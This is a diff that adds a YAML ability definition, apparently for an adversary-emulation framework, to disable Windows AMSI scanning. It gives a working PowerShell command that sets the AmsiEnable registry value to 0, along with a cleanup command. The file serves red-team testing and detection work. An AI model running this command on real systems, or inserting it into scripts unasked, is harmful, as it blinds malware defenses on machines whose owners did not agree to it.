@@ -1,0 +1,24 @@
+---
+- id: c17b2f5b2d9939868ea6819acb523af2
+  name: AMSI Bypass - Create AMSIEnable Reg Key
+  description: "Threat Actor could disable the AMSI function by adding a registry\
+    \ value name \u201CAmsiEnable\u201D to the registry key \u201CHKCU\\Software\\\
+    Microsoft\\Windows Script\\Settings\\AmsiEnable\u201D and set its value to 0.\n\
+    Ref: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d\n"
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings"
+          -Force | Out-Null; New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows
+          Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force
+          | Out-Null
+        payloads: []
+        cleanup: Remove-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings"
+          -Recurse -Force 2> $null
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
